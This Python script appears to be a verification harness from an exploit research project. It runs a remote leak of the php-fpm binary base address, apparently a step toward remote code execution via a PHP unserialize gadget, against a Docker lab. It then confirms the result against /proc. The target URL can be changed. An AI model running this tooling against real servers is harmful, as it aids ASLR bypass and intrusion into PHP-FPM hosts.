#!/usr/bin/env python3
"""verify fpm_binbase_leak.py: derive binbase remotely, cross-check /proc.

/proc is used ONLY to confirm the remote derivation (ground truth); the leak
itself in fpm_binbase_leak.py is black-box. Run with python3 -I.

Default lab (stand up first; committed brleak profile, 8.4.26-fpm + nginx :8169):
    docker compose -f docker-compose.fpm-avenues.yml --profile brleak up -d --build
The fpm container (p2s-brleak-fpm) runs with pm.max_children=1 (one pinned
worker) and the reflecting sink at /remote_app.php:
``echo serialize(@unserialize($_POST['cook']));`` with a CachedData Serializable
gadget doing the 9th-property insert. (The sibling verifier
verify_fpm_binbase_leak_recal.py uses the same brleak profile.)

Cross-check source:
    docker exec <fpm-container> grep php-fpm /proc/<worker>/maps   (first line = base)
"""

import argparse
import importlib.util
import os
import subprocess
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)


def load_poc():
    path = os.path.join(_HERE, "fpm_binbase_leak.py")
    spec = importlib.util.spec_from_file_location("fpm_binbase_leak", path)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def proc_base(container):
    """Read the php-fpm worker's image base from /proc/<worker>/maps."""
    try:
        wpid = subprocess.check_output(
            ["docker", "exec", container, "sh", "-c",
             "ps -eo pid,args | grep 'pool www' | grep -v grep | head -1 | awk '{print $1}'"],
            text=True, timeout=20).strip()
        line = subprocess.check_output(
            ["docker", "exec", container, "sh", "-c",
             f"grep php-fpm /proc/{wpid}/maps | head -1"],
            text=True, timeout=20).strip()
        base = int(line.split("-", 1)[0], 16)
        return wpid, base
    except Exception as e:
        return None, None


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--url", default="http://127.0.0.1:8169/remote_app.php")
    ap.add_argument("--container", default="p2s-brleak-fpm",
                    help="fpm container name for /proc cross-check")
    ap.add_argument("--tries", type=int, default=12)
    args = ap.parse_args(argv)

    from urllib.parse import urlsplit
    u = urlsplit(args.url if "://" in args.url else "http://" + args.url)
    poc = load_poc()
    remote_rce = poc._load_remote_rce()
    remote_rce.HOST = u.hostname
    remote_rce.PORT = u.port or 80
    remote_rce.PATH = u.path or "/remote_app.php"
    print(f"[*] target {remote_rce.HOST}:{remote_rce.PORT}{remote_rce.PATH}")

    binbase, detail = poc.leak_binbase(remote_rce, leak_tries=args.tries)
    if binbase is None:
        print(f"[-] remote leak FAILED: {detail.get('error')}")
        return 2
    print(f"[+] REMOTE  binbase = {binbase:#x} "
          f"({detail['agree']} image pointer(s) agree)")

    wpid, base = proc_base(args.container)
    if base is None:
        print(f"[!] could not read /proc (container {args.container}); "
              f"remote-only result stands, not cross-checked")
        return 0
    print(f"[+] /proc   binbase = {base:#x}  (worker pid {wpid})")

    if binbase == base:
        print("[PASS] remote-derived binbase EXACTLY matches /proc ground truth")
        return 0
    print(f"[FAIL] mismatch: remote {binbase:#x} != /proc {base:#x} "
          f"(delta {binbase-base:#x})")
    return 1


if __name__ == "__main__":
    sys.exit(main())
